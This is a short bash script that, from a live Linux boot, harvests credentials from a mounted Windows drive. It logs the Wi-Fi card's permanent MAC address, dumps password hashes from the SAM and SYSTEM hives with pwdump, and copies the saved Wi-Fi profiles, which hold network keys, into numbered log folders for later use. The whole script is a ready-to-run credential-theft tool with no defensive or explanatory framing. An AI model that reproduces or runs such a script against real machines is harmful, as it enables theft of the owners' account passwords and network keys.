#!/usr/bin/env bash
home=$(pwd)
store=${home}"/infologs"
cd infologs

lognumber=$(ls log*.txt | wc -l)

cd ..
#mkdir if dir doesnt exist
mkdir -p infologs
hashfile=${home}"/infologs/log${lognumber}.txt"
echo "**In updated Windows versions, hashes are likely null.**"

echo "##############" >> ${hashfile}
echo "Label (arg1): ${1}" >> ${hashfile}
macchanger -s wlan0 | grep "Permanent" >> ${hashfile}

cd /media/root/OS/Windows/System32/config
pwdump SYSTEM SAM >> ${hashfile}
cd $home

cp -R /media/root/OS/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces $store"/wifiof${lognumber}/"

cat $hashfile
